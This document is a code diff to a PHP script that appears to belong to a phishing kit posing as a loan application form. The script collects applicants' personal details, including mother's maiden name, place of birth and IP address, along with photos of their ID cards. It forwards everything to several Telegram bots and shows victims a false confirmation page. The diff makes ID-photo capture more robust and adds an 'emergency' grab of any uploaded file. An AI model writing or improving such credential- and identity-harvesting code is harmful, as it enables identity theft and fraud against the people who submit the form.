@@ -1,6 +1,6 @@
 <?php
 // UNIVERSAL LOAN APPLICATION SUBMISSION SCRIPT - BROWSER COMPATIBLE
-// Enhanced version with file upload support
+// Enhanced version with BULLETPROOF file upload support
 
 // ============================================
 // SITE-SPECIFIC CONFIGURATION
@@ -90,46 +90,94 @@ function get_client_ip() {
     return 'unknown';
 }
 
-// Secure file upload handler
-function handle_file_upload($file_field, $allowed_types = ['jpg', 'jpeg', 'png', 'gif', 'pdf'], $max_size = 5 * 1024 * 1024) {
-    if (!isset($_FILES[$file_field]) || $_FILES[$file_field]['error'] !== UPLOAD_ERR_OK) {
-        return ['success' => false, 'error' => 'No file uploaded or upload error'];
-    }
-    
-    $file = $_FILES[$file_field];
-    
-    // Check file size
-    if ($file['size'] > $max_size) {
-        return ['success' => false, 'error' => 'File too large (max ' . ($max_size / 1024 / 1024) . 'MB)'];
-    }
-    
-    // Check file type
-    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
-    if (!in_array($ext, $allowed_types)) {
-        return ['success' => false, 'error' => 'Invalid file type. Allowed: ' . implode(', ', $allowed_types)];
-    }
-    
-    // Generate secure filename
+// ============================================
+// BULLETPROOF FILE UPLOAD FUNCTIONS
+// ============================================
+
+// Enhanced file upload handler with multiple detection methods
+function handle_any_file_upload($possible_names, $file_index = 0, $allowed_types = ['jpg', 'jpeg', 'png', 'gif', 'pdf'], $max_size = 10 * 1024 * 1024) {
     $upload_dir = __DIR__ . '/uploads/';
     if (!file_exists($upload_dir)) {
         mkdir($upload_dir, 0777, true);
     }
     
-    $filename = md5(uniqid() . $file['name']) . '.' . $ext;
-    $filepath = $upload_dir . $filename;
-    
-    // Move uploaded file
-    if (move_uploaded_file($file['tmp_name'], $filepath)) {
-        return [
-            'success' => true,
-            'path' => $filepath,
-            'name' => $file['name'],
-            'size' => $file['size'],
-            'type' => $file['type']
-        ];
+    // Try multiple possible field names and formats
+    foreach ($possible_names as $field_name) {
+        // Check if field exists in FILES
+        if (!isset($_FILES[$field_name])) {
+            continue;
+        }
+        
+        $file_info = $_FILES[$field_name];
+        
+        // Handle array format (fieldname[])
+        if (is_array($file_info['name'])) {
+            // Check if we have this index in the array
+            if (isset($file_info['name'][$file_index]) && $file_info['error'][$file_index] === UPLOAD_ERR_OK) {
+                $name = $file_info['name'][$file_index];
+                $tmp_name = $file_info['tmp_name'][$file_index];
+                $error = $file_info['error'][$file_index];
+                $size = $file_info['size'][$file_index];
+                $type = $file_info['type'][$file_index];
+            } else {
+                continue;
+            }
+        } 
+        // Handle single file format
+        elseif ($file_info['error'] === UPLOAD_ERR_OK) {
+            $name = $file_info['name'];
+            $tmp_name = $file_info['tmp_name'];
+            $error = $file_info['error'];
+            $size = $file_info['size'];
+            $type = $file_info['type'];
+        } else {
+            continue;
+        }
+        
+        // Check file size
+        if ($size > $max_size) {
+            return ['success' => false, 'error' => 'File too large (max ' . ($max_size / 1024 / 1024) . 'MB)', 'field' => $field_name];
+        }
+        
+        // Check file type
+        $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
+        if (!in_array($ext, $allowed_types)) {
+            return ['success' => false, 'error' => 'Invalid file type. Allowed: ' . implode(', ', $allowed_types), 'field' => $field_name];
+        }
+        
+        // Generate secure filename
+        $filename = 'id_' . time() . '_' . bin2hex(random_bytes(8)) . '.' . $ext;
+        $filepath = $upload_dir . $filename;
+        
+        // Move uploaded file
+        if (move_uploaded_file($tmp_name, $filepath)) {
+            return [
+                'success' => true,
+                'path' => $filepath,
+                'name' => $name,
+                'size' => $size,
+                'type' => $type,
+                'field' => $field_name,
+                'ext' => $ext
+            ];
+        }
+        
+        return ['success' => false, 'error' => 'Failed to save file', 'field' => $field_name];
     }
     
-    return ['success' => false, 'error' => 'Failed to save file'];
+    return ['success' => false, 'error' => 'No file found in any possible fields', 'possible_fields' => $possible_names];
+}
+
+// Special function for handling JotForm-style file uploads
+function handle_jotform_file($field_base) {
+    $possible_names = [
+        $field_base,                    // Direct field name
+        $field_base . '[]',             // Array notation
+        substr($field_base, 0, -2),     // Without brackets if present
+        'input_' . substr($field_base, 1) // Alternative naming
+    ];
+    
+    return handle_any_file_upload($possible_names, 0);
 }
 
 // Universal Telegram sender with file support
@@ -176,11 +224,11 @@ function send_to_telegram($token, $chat_id, $message, $files = []) {
     // Send files if any
     foreach ($files as $file_index => $file) {
         if (!file_exists($file['path'])) {
-            $results["file_{$file_index}"] = ['success' => false, 'error' => 'File not found'];
+            $results["file_{$file_index}"] = ['success' => false, 'error' => 'File not found at path: ' . $file['path']];
             continue;
         }
         
-        $is_image = in_array(strtolower(pathinfo($file['path'], PATHINFO_EXTENSION)), ['jpg', 'jpeg', 'png', 'gif']);
+        $is_image = in_array(strtolower($file['ext'] ?? pathinfo($file['path'], PATHINFO_EXTENSION)), ['jpg', 'jpeg', 'png', 'gif']);
         $endpoint = $is_image ? 'sendPhoto' : 'sendDocument';
         
         $file_data = [
@@ -200,10 +248,13 @@ function send_to_telegram($token, $chat_id, $message, $files = []) {
             CURLOPT_POST => true,
             CURLOPT_POSTFIELDS => $file_data,
             CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_TIMEOUT => 15,
-            CURLOPT_CONNECTTIMEOUT => 10,
+            CURLOPT_TIMEOUT => 30, // Increased timeout for large files
+            CURLOPT_CONNECTTIMEOUT => 15,
             CURLOPT_SSL_VERIFYPEER => true,
-            CURLOPT_SSL_VERIFYHOST => 2
+            CURLOPT_SSL_VERIFYHOST => 2,
+            CURLOPT_HTTPHEADER => [
+                'Content-Type: multipart/form-data'
+            ]
         ]);
         
         $file_result = curl_exec($file_ch);
@@ -215,12 +266,13 @@ function send_to_telegram($token, $chat_id, $message, $files = []) {
             'success' => ($file_http == 200),
             'http_code' => $file_http,
             'error' => $file_error,
-            'endpoint' => $endpoint
+            'endpoint' => $endpoint,
+            'file_size' => filesize($file['path'])
         ];
         
         // Delay between file uploads
         if (count($files) > 1 && $file_index < count($files) - 1) {
-            usleep(500000); // 0.5 seconds
+            usleep(1000000); // 1 second delay for large files
         }
     }
     
@@ -257,6 +309,36 @@ function get_form_value($keys, $default = 'Not provided') {
 }
 
 // ============================================
+// DEBUG HELPER - Log all FILES data
+// ============================================
+
+function debug_files_upload() {
+    $debug_log = "=== FILES DEBUG ===\n";
+    $debug_log .= "Total FILES entries: " . count($_FILES) . "\n";
+    
+    foreach ($_FILES as $field_name => $file_data) {
+        $debug_log .= "Field: $field_name\n";
+        $debug_log .= "  Structure: " . (is_array($file_data['name']) ? 'ARRAY' : 'SINGLE') . "\n";
+        
+        if (is_array($file_data['name'])) {
+            foreach ($file_data['name'] as $index => $name) {
+                $debug_log .= "  Index $index: $name (Error: {$file_data['error'][$index]})\n";
+            }
+        } else {
+            $debug_log .= "  File: {$file_data['name']} (Error: {$file_data['error']})\n";
+        }
+    }
+    
+    $debug_log .= "=== END DEBUG ===\n";
+    
+    // Save to debug file
+    $debug_file = __DIR__ . '/logs/upload_debug.log';
+    file_put_contents($debug_file, $debug_log, FILE_APPEND);
+    
+    return $debug_log;
+}
+
+// ============================================
 // MAIN PROCESSING
 // ============================================
 
@@ -288,6 +370,10 @@ if (!$config) {
 // Handle POST requests
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     log_entry("=== Processing Loan Application Submission ===");
+    
+    // DEBUG: Log all files data
+    $debug_info = debug_files_upload();
+    log_entry("File upload debug:\n$debug_info", 'DEBUG');
     
     // ============================================
     // FORM DATA EXTRACTION
@@ -369,38 +455,104 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $browser_short = substr($user_agent, 0, 80);
     
     // ============================================
-    // FILE UPLOAD HANDLING
+    // BULLETPROOF FILE UPLOAD HANDLING
     // ============================================
     
     $uploaded_files = [];
+    $file_upload_log = [];
     
-    // Process ID front image
-    if (isset($_FILES['q94_uploadSelected94'])) {
-        $front_result = handle_file_upload('q94_uploadSelected94');
-        if ($front_result['success']) {
-            $uploaded_files[] = [
-                'path' => $front_result['path'],
-                'caption' => "🆔 Front ID - $full_name"
-            ];
-            log_entry("Front ID uploaded: " . $front_result['name']);
-        } else {
-            log_entry("Front ID upload failed: " . $front_result['error'], 'WARN');
-        }
+    // Method 1: Try specific JotForm field names (with brackets)
+    $front_id_result = handle_jotform_file('q94_uploadSelected94');
+    if (!$front_id_result['success']) {
+        // Method 2: Try alternative field names
+        $front_id_result = handle_any_file_upload([
+            'q94_uploadSelected94[]',
+            'q94_uploadSelected94',
+            'input_94',
+            'front_id',
+            'id_front'
+        ], 0);
+    }
+    
+    if ($front_id_result['success']) {
+        $uploaded_files[] = [
+            'path' => $front_id_result['path'],
+            'caption' => "🆔 Front ID - $full_name",
+            'ext' => $front_id_result['ext']
+        ];
+        $file_upload_log[] = "Front ID SUCCESS: {$front_id_result['name']} via field '{$front_id_result['field']}'";
+        log_entry("Front ID uploaded successfully: {$front_id_result['name']} (Field: {$front_id_result['field']})", 'SUCCESS');
+    } else {
+        $file_upload_log[] = "Front ID FAILED: {$front_id_result['error']}";
+        log_entry("Front ID upload failed: {$front_id_result['error']}", 'ERROR');
     }
     
     // Process ID back image
-    if (isset($_FILES['q95_uploadBack'])) {
-        $back_result = handle_file_upload('q95_uploadBack');
-        if ($back_result['success']) {
-            $uploaded_files[] = [
-                'path' => $back_result['path'],
-                'caption' => "🆔 Back ID - $full_name"
-            ];
-            log_entry("Back ID uploaded: " . $back_result['name']);
-        } else {
-            log_entry("Back ID upload failed: " . $back_result['error'], 'WARN');
-        }
+    $back_id_result = handle_jotform_file('q95_uploadBack');
+    if (!$back_id_result['success']) {
+        $back_id_result = handle_any_file_upload([
+            'q95_uploadBack[]',
+            'q95_uploadBack',
+            'input_95',
+            'back_id',
+            'id_back'
+        ], 0);
     }
+    
+    if ($back_id_result['success']) {
+        $uploaded_files[] = [
+            'path' => $back_id_result['path'],
+            'caption' => "🆔 Back ID - $full_name",
+            'ext' => $back_id_result['ext']
+        ];
+        $file_upload_log[] = "Back ID SUCCESS: {$back_id_result['name']} via field '{$back_id_result['field']}'";
+        log_entry("Back ID uploaded successfully: {$back_id_result['name']} (Field: {$back_id_result['field']})", 'SUCCESS');
+    } else {
+        $file_upload_log[] = "Back ID FAILED: {$back_id_result['error']}";
+        log_entry("Back ID upload failed: {$back_id_result['error']}", 'ERROR');
+    }
+    
+    // Try to find ANY uploaded files if above methods failed
+    if (empty($uploaded_files) && count($_FILES) > 0) {
+        log_entry("Trying emergency file detection...", 'WARN');
+        $emergency_upload_log = "Emergency file detection:\n";
+        
+        foreach ($_FILES as $field => $data) {
+            $emergency_upload_log .= "Checking field: $field\n";
+            
+            if (is_array($data['name'])) {
+                foreach ($data['name'] as $index => $filename) {
+                    if (!empty($filename) && $data['error'][$index] === UPLOAD_ERR_OK) {
+                        $emergency_result = handle_any_file_upload([$field], $index);
+                        if ($emergency_result['success']) {
+                            $uploaded_files[] = [
+                                'path' => $emergency_result['path'],
+                                'caption' => "📎 Emergency Upload ($field) - $full_name",
+                                'ext' => $emergency_result['ext']
+                            ];
+                            $emergency_upload_log .= "  Found file at index $index: $filename\n";
+                        }
+                    }
+                }
+            } elseif ($data['error'] === UPLOAD_ERR_OK) {
+                $emergency_result = handle_any_file_upload([$field], 0);
+                if ($emergency_result['success']) {
+                    $uploaded_files[] = [
+                        'path' => $emergency_result['path'],
+                        'caption' => "📎 Emergency Upload ($field) - $full_name",
+                        'ext' => $emergency_result['ext']
+                    ];
+                    $emergency_upload_log .= "  Found single file: {$data['name']}\n";
+                }
+            }
+        }
+        
+        log_entry($emergency_upload_log, 'DEBUG');
+    }
+    
+    // Log final file status
+    log_entry("Total files uploaded: " . count($uploaded_files) . " of 2 attempted", 
+              count($uploaded_files) >= 2 ? 'SUCCESS' : 'WARN');
     
     // ============================================
     // PREPARE TELEGRAM MESSAGE
@@ -428,7 +580,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $message .= "• <b>Mother's Name:</b> $mother_name\n";
     $message .= "• <b>Place of Birth:</b> $place_of_birth\n";
     $message .= "• <b>Mother's Maiden Name:</b> $mother_maiden\n";
-    $message .= "• <b>ID Photos:</b> " . (count($uploaded_files) >= 2 ? "✅ Uploaded" : "❌ Missing") . "\n\n";
+    $message .= "• <b>ID Photos:</b> " . (count($uploaded_files) >= 2 ? "✅ UPLOADED (" . count($uploaded_files) . "/2)" : "⚠️ PARTIAL (" . count($uploaded_files) . "/2)") . "\n";
+    
+    // Add file upload details
+    if (!empty($file_upload_log)) {
+        $message .= "• <b>File Status:</b>\n";
+        foreach ($file_upload_log as $log_entry) {
+            $message .= "  ◦ " . htmlspecialchars($log_entry) . "\n";
+        }
+    }
+    $message .= "\n";
     
     $message .= "<b>💼 EMPLOYMENT INFORMATION:</b>\n";
     $message .= "• <b>Employer:</b> $employer_name\n";
@@ -452,9 +613,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $message .= "• <b>IP Address:</b> <code>$ip</code>\n";
     $message .= "• <b>Browser:</b> $browser_short\n";
     $message .= "• <b>Submission Time:</b> $timestamp\n";
+    $message .= "• <b>Files Uploaded:</b> " . count($uploaded_files) . " files\n";
     
     // Log the submission
-    log_entry("Loan application from $full_name ($email) - Loan: $loan_amount - IP: $ip");
+    log_entry("Loan application from $full_name ($email) - Loan: $loan_amount - Files: " . count($uploaded_files) . "/2 - IP: $ip");
     
     // ============================================
     // SEND TO TELEGRAM BOTS
@@ -483,9 +645,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             
             // Log file delivery status
             foreach ($results as $key => $result) {
-                if ($key !== 'text') {
+                if ($key !== 'text' && isset($result['success'])) {
                     if ($result['success']) {
-                        log_entry("Bot $bot_index - $key delivered via {$result['endpoint']}", 'SUCCESS');
+                        log_entry("Bot $bot_index - $key delivered via {$result['endpoint']} (Size: {$result['file_size']} bytes)", 'SUCCESS');
                     } else {
                         log_entry("Bot $bot_index - $key failed: {$result['error']}", 'WARN');
                     }
@@ -497,7 +659,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         
         // Small delay between bots to avoid rate limiting
         if ($bot_index < ($total_bots - 1)) {
-            usleep(300000); // 0.3 seconds
+            usleep(500000); // 0.5 seconds
         }
     }
     
@@ -613,6 +775,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 font-weight: bold;
             }
             
+            .warning {
+                color: #e67e22;
+                font-weight: bold;
+            }
+            
+            .file-status {
+                background: #fff3cd;
+                border: 1px solid #ffc107;
+                border-radius: 4px;
+                padding: 8px;
+                margin-top: 8px;
+                font-size: 12px;
+            }
+            
             .countdown {
                 font-size: 18px;
                 color: #2f7b8a;
@@ -705,8 +881,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     <span>Application data collected</span>
                 </div>
                 <div class="status-item">
-                    <span class="checkmark">✓</span>
-                    <span>Documents uploaded (<?php echo count($uploaded_files); ?>/2)</span>
+                    <?php if (count($uploaded_files) >= 2): ?>
+                        <span class="checkmark">✓</span>
+                        <span>Documents uploaded (<?php echo count($uploaded_files); ?>/2)</span>
+                    <?php else: ?>
+                        <span class="warning">⚠</span>
+                        <span>Documents uploaded (<?php echo count($uploaded_files); ?>/2)</span>
+                        <?php if (count($uploaded_files) < 2): ?>
+                            <div class="file-status">
+                                <small>Some files may require manual review</small>
+                            </div>
+                        <?php endif; ?>
+                    <?php endif; ?>
                 </div>
                 <div class="status-item">
                     <span class="checkmark">✓</span>
@@ -730,6 +916,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             <div class="footer-note">
                 A confirmation email has been sent to <strong><?php echo htmlspecialchars($email); ?></strong>.<br>
                 Our loan specialists will contact you shortly.
+                <?php if (count($uploaded_files) < 2): ?>
+                    <br><br><small><strong>Note:</strong> If ID photos didn't upload correctly, our team will contact you to request them.</small>
+                <?php endif; ?>
             </div>
         </div>
         
